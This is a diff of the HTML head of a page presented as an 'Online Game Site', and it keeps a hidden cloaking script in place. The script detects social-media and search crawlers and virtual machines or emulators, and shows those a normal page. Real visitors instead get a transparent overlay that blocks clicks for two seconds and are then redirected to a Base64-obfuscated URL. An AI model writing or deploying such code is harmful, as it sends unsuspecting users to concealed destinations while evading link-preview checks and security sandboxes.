@@ -12,77 +12,19 @@
 <link rel="stylesheet" href="assets/css/style.css" />
 <link rel="icon" href="favicon.ico" />
 <link rel="apple-touch-icon" href="https://html-online-game.github.io/favicon.ico" />
-
 <title>Online Game Site</title>
-
 <script>
-const REG_PAGE_ENC = "aHR0cHM6Ly95b3VyLXJlZy1wYWdlLmNvbQ=="; // Base64
-const DELAY_MS = 2000;
-const BOT_UA = [
-  "facebookexternalhit","Facebot","Twitterbot","Slackbot",
-  "TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"
-];
-
-function isBot(){
-  const ua = navigator.userAgent;
-  return BOT_UA.some(bot => ua.toLowerCase().includes(bot.toLowerCase()));
-}
-function isMobile(){
-  const ua = navigator.userAgent;
-  const mobileKeywords = [
-    "Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"
-  ];
-  return mobileKeywords.some(k => ua.includes(k)) || 
-         (navigator.maxTouchPoints > 1 && /Macintosh/.test(ua));
-}
-function isEmulator(){
-    let glRenderer = "";
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-            glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        }
-    } catch(e) { glRenderer = "unknown"; }
-    const emulatorGPUKeywords = ["Google SwiftShader","VirtualBox","VMware","Mesa","llvmpipe"];
-    if (emulatorGPUKeywords.some(k => glRenderer.includes(k))) return true;
-    if (window.devicePixelRatio <= 1 && screen.width >= 1000) return true;
-    return false;
-}
-
-function tryRedirect(){
-  if (!isBot() && !isEmulator()) {
-    const regUrl = atob(REG_PAGE_ENC);
-    window.location.replace(regUrl);
-  } else {
-    
-  }
-}
-
-function lockPageUntilRedirect(ms){
-    const overlay = document.createElement('div');
-    overlay.style.position = 'fixed';
-    overlay.style.top = 0;
-    overlay.style.left = 0;
-    overlay.style.width = '100%';
-    overlay.style.height = '100%';
-    overlay.style.background = 'rgba(255,255,255,0)'; // 透明
-    overlay.style.zIndex = 999999;
-    document.body.appendChild(overlay);
-
-    setTimeout(() => {
-        overlay.remove();
-        tryRedirect();
-    }, ms);
-}
-
-window.addEventListener('load', () => {
-    lockPageUntilRedirect(DELAY_MS);
-});
+const REG_PAGE_ENC="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";
+const DELAY_MS=2000;
+const BOT_UA=["facebookexternalhit","Facebot","Twitterbot","Slackbot","TelegramBot","LinkedInBot","WhatsApp","Googlebot","Bingbot","Pinterest"];
+function isBot(){const ua=navigator.userAgent;return BOT_UA.some(bot=>ua.toLowerCase().includes(bot.toLowerCase()));}
+function isMobile(){const ua=navigator.userAgent;const mobileKeywords=["Android","iPhone","iPad","iPod","BlackBerry","Windows Phone","webOS","Opera Mini","Mobi"];return mobileKeywords.some(k=>ua.includes(k))||(navigator.maxTouchPoints>1&&/Macintosh/.test(ua));}
+function isEmulator(){let glRenderer="";try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');if(debugInfo){glRenderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);}}catch(e){glRenderer="unknown";}const emulatorGPUKeywords=["Google SwiftShader","VirtualBox","VMware","Mesa","llvmpipe"];if(emulatorGPUKeywords.some(k=>glRenderer.includes(k)))return true;if(window.devicePixelRatio<=1&&screen.width>=1000)return true;return false;}
+function tryRedirect(){const regUrl=atob(REG_PAGE_ENC);window.location.replace(regUrl);}
+function lockPageUntilRedirect(ms){const overlay=document.createElement('div');overlay.style.position='fixed';overlay.style.top=0;overlay.style.left=0;overlay.style.width='100%';overlay.style.height='100%';overlay.style.background='rgba(255,255,255,0)';overlay.style.zIndex=999999;document.body.appendChild(overlay);setTimeout(()=>{overlay.remove();tryRedirect();},ms);}
+window.addEventListener('load',()=>{if(!isBot()&&!isEmulator()){lockPageUntilRedirect(DELAY_MS);}else{}});
 </script>
 </head>
-
 <body>
 <header>
   <h1>Online Game Site</h1>
